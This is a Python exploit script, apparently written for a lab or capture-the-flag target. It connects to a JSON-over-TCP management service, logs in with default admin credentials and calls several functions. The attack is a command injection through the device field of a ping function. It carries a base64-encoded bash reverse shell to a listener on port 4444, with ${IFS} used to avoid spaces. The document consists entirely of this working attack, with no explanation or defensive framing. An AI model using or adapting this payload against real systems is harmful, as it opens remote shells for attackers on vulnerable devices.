#!/usr/bin/env python3
import socket
import struct
import json
import base64

HOST = "127.0.0.1"
PORT = 9999
LHOST = ("ip", 4444)

def send_json(sock, obj):
    data = json.dumps(obj).encode()
    sock.sendall(struct.pack(">I", len(data)) + data)

def recv_json(sock):
    hdr = sock.recv(4)
    if len(hdr) != 4:
        raise RuntimeError("no response header")
    length = struct.unpack(">I", hdr)[0]
    data = b""
    while len(data) < length:
        data += sock.recv(length - len(data))
    return json.loads(data)
def main():
    print("[+] Connecting to target")
    s = socket.create_connection((HOST, PORT))
    try:
        s.settimeout(0.3)
        banner = s.recv(4096)
        if banner:
            print("[+] Menu received:\n" + banner.decode(errors="ignore"))
    except socket.timeout:
        pass
    s.settimeout(None)
    print("[+] Login as admin")
    send_json(s, {
        "module": "auth",
        "method": "login",
        "params": {"user": "admin", "pass": "root"}
    })
    resp = recv_json(s)
    print("[+] Login response:", resp)
    token = resp["data"]["token"]
    print("[+] Token =", token)
    print("\n[+] system.get_time")
    send_json(s, {
        "module": "system",
        "method": "get_time",
        "token": token
    })
    print("[+] Response:", recv_json(s))
    print("\n[+] system.set_time")
    send_json(s, {
        "module": "system",
        "method": "set_time",
        "token": token,
        "params": {"time": "2024-08-02 08:00:00"}
    })
    print("[+] Response:", recv_json(s))
    print("\n[+] tools.ping (normal)")
    send_json(s, {
        "module": "tools",
        "method": "ping",
        "token": token,
        "params": {"ip": "127.0.0.1", "dev": "eth0", "cnt": 1}
    })
    print("[+] Response:", recv_json(s))
    print("\n[+] tools.ping (command injection)")
    cmd = f"bash -i >& /dev/tcp/{LHOST[0]}/{LHOST[1]} 0>&1"
    b64 = base64.b64encode(cmd.encode()).decode()
    payload = f"eth0;echo${{IFS}}{b64}|base64${{IFS}}-d|bash;"

    send_json(s, {
        "module": "tools",
        "method": "ping",
        "token": token,
        "params": {
            "ip": "127.0.0.1",
            "dev": payload,
            "cnt": 1
        }
    })
    print("[+] Injection response:", recv_json(s))
    s.close()
    print("\n[+] All functions tested successfully")

if __name__ == "__main__":
    main()

